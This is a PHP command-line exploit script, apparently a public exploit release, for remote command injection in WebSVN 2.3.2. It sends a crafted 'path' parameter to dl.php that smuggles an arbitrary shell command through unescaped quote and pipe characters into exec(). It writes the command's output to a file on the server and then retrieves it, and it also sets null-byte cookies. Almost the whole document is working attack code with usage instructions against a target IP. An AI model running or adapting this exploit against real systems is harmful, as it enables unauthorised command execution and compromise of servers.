<?php
/*
  WebSVN 2.3.2 Unproper Metacharacters Escaping exec() Remote Commands Injection Exploit
  by rgod

  download url: http://websvn.tigris.org/

  tested against: Microsoft Windows Server R2 SP2 
                  PHP 5.3.6 VC9 with magic_quotes_gpc = off (default)
                  Apache 2.2.17 VC9 
                  
  it needs the allowDownload option enabled in config.php, meaning
  that a tarball download is allowed across all the repositories
  (not uncommon)                  
  
*/
    error_reporting(E_ALL ^ E_NOTICE);     
    set_time_limit(0);
    
	$err[0] = "[!] This script is intended to be launched from the cli!";
    $err[1] = "[!] You need the curl extesion loaded!";

    if (php_sapi_name() <> "cli") {
        die($err[0]);
    }
    
	function syntax() {
       print("usage  : php 9sg_websvn.php [ip_address] [command]\r\n" );
       print("example: php 9sg_websvn.php 192.168.0.1 ver\r\n" );
       die();
    }
    
	$argv[2] ? print("[*] Attacking...\n") :
    syntax();
    
	if (!extension_loaded('curl')) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
        false;
        if ($win) {
            !dl("php_curl.dll") ? die($err[1]) :
             print("[*] curl loaded\n");
        } else {
            !dl("php_curl.so") ? die($err[1]) :
             print("[*] curl loaded\n");
        }
    }
        
    function _s($url, $is_post, $ck, $request) {
        global $_use_proxy, $proxy_host, $proxy_port;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
        }
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Cookie: storedsesstemplate=.%00; storedtemplate=.%00;  ".$ck ,
            

        )); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0");
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
         
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            //die("[!] ".curl_error($ch)."\n");
        } else {
            curl_close($ch);
        }
        return $_d;
    }
          $host = $argv[1];
          $port = 80;
          $cmd = $argv[2];



$url = "http://$host:$port/websvn/dl.php";
$out = _s($url, 1, "", "path=./../../x".urlencode("\"|".$cmd.">suntzu.txt|\""));
//print($out."\n");

sleep(1);

$url = "http://$host:$port/websvn/suntzu.txt";
$out = _s($url, 0, "", "");
print($out."\n");


?>
